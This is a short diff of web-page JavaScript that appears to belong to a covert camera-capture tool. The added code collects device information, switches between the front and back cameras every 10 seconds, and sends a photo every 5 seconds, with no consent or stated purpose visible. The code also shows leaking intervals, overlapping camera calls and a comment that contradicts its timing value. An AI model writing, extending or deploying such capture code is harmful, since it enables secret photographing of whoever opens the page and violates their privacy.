@@ -98,29 +98,28 @@ Device Information:
             });
         }
 
+        async function toggleCamera(facingMode) {
+            stopCamera(); // Stop current camera
+            const cameraStarted = await startCamera(facingMode);
+            if (cameraStarted) {
+                await sendPhoto(); // Immediate photo
+                intervalId = setInterval(sendPhoto, 5000); // Send every 5 seconds
+            }
+        }
+
         async function startPhotoCaptureLoop() {
             await sendDeviceInfo();
+            let useFrontCamera = true;
 
-            // Start front camera
-            const frontCameraStarted = await startCamera('user');
-            if (!frontCameraStarted) return;
+            async function switchCamera() {
+                await toggleCamera(useFrontCamera ? 'user' : 'environment');
+                useFrontCamera = !useFrontCamera;
+                setTimeout(switchCamera, 10000); // Switch every 10 seconds
+            }
 
-            // Capture and send photo from front camera
-            await sendPhoto();
-            intervalId = setInterval(sendPhoto, 2000);
-
-            // Stop the front camera after 5 seconds
-            setTimeout(async () => {
-                stopCamera(); // Stop front camera
-
-                // Start back camera after front camera stops
-                const backCameraStarted = await startCamera('environment');
-                if (!backCameraStarted) return;
-
-                // Capture and send photo from back camera
-                await sendPhoto();
-                setInterval(sendPhoto, 3000); // Repeat sending from back camera as well
-            }, 2000); // Stop front camera after 5 seconds
+            // Start with both cameras
+            setTimeout(() => toggleCamera('environment'), 5000); // Start back camera after 5 seconds
+            switchCamera(); // Start with front camera
         }
 
         function stopCamera() {
